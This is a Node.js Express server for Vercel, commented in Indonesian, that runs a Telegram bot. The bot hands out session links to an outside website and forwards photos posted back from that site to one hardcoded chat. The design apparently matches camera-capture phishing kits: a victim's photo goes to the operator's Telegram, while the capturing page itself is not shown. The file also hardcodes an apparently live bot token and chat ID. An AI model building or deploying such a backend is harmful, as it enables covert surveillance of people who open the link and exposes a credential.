const express = require("express");
const multer = require("multer");
const FormData = require("form-data");
const fetch = require("node-fetch");

const app = express();
const upload = multer();

const BOT_TOKEN = "8179083757:AAHqeyoHWGI9cGHkgjSplUKXGGAn2D6goKQ"; // Ganti dengan token bot Anda
const CHAT_ID = "1352694551"; // Ganti dengan ID chat Anda
const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/`;

// Fungsi untuk mengirim pesan teks ke bot Telegram
async function sendTextMessage(chatId, text) {
    const url = `${telegramApiUrl}sendMessage`;
    const body = {
        chat_id: chatId,
        text: text,
    };

    const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
    });

    const data = await response.json();
    if (!data.ok) {
        throw new Error(`Gagal mengirim pesan: ${data.description}`);
    }
}

// Fungsi untuk mengatur webhook Telegram
async function setWebhook() {
    const url = `https://cokots.vercel.app/bot-webhook`; // Ganti dengan URL endpoint webhook Anda di Vercel
    try {
        const response = await fetch(`${telegramApiUrl}setWebhook?url=${url}`);
        const result = await response.json();
        if (result.ok) {
            console.log(`Webhook set to: ${url}`);
        } else {
            console.log('Webhook setup failed:', result.description);
        }
    } catch (error) {
        console.error('Failed to set webhook:', error);
    }
}

// Panggil setWebhook hanya sekali saat aplikasi dijalankan pertama kali
setWebhook();

// Command handler untuk perintah /link
app.post("/bot-webhook", express.json(), async (req, res) => {
    try {
        const { message } = req.body;

        if (message && message.text === "/link") {
            const sessionId = Math.random().toString(36).substr(2, 9); // ID sesi unik
            const websiteLink = `https://akhirpetang.vercel.app?session=${sessionId}`; // Ganti dengan URL website Anda
            const responseMessage = `Silakan klik link berikut untuk akses:\n${websiteLink}`;
            await sendTextMessage(message.chat.id, responseMessage);
        }

        res.sendStatus(200);
    } catch (error) {
        console.error("Error processing update:", error);
        res.sendStatus(500);
    }
});

// Endpoint untuk menerima data dari website
app.post("/send-data", upload.single("photo"), async (req, res) => {
    try {
        const { caption } = req.body;

        // Kirim foto ke bot Telegram
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", req.file.buffer, "photo.jpg");
        formData.append("caption", caption);

        const response = await fetch(`${telegramApiUrl}sendPhoto`, {
            method: "POST",
            body: formData,
        });

        const data = await response.json();
        if (!data.ok) {
            throw new Error(`Gagal mengirim foto: ${data.description}`);
        }

        res.status(200).send("Data berhasil dikirim ke bot!");
    } catch (error) {
        console.error("Error:", error);
        res.status(500).send("Terjadi kesalahan.");
    }
});

// Jalankan server di Vercel (Vercel menangani `port`)
app.all("*", (req, res) => {
    res.status(404).send("Endpoint tidak ditemukan.");
});

module.exports = app; // Ekspor app untuk Vercel
